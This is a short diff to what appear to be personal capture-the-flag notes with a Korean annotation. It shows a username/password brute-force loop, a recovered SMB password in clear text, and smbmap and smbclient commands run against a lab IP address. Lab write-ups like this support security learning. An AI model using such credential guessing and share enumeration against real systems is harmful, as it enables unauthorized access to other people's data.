@@ -1304,3 +1304,17 @@ for u in $(cat users.txt); do for p in $(cat pass.txt); do echo "Testing $u:$p";
 > 비밀번호 발견
 We have changed your smb password after system malfunction.
 Password: )s{A&2Z=F^n_E.B`
+
+
+> smbmap map 
+
+smbmap -u milesdyson -p )s{A&2Z=F^n_E.B` -H 10.48.172.131
+
+> parsing error                                                                       
+zsh: parse error near `)'
+
+> Wrap ''                          
+
+smbmap -u milesdyson -p ')s{A&2Z=F^n_E.B`' -H 10.48.172.131
+
+smbclient //10.48.172.131/milesdyson -N
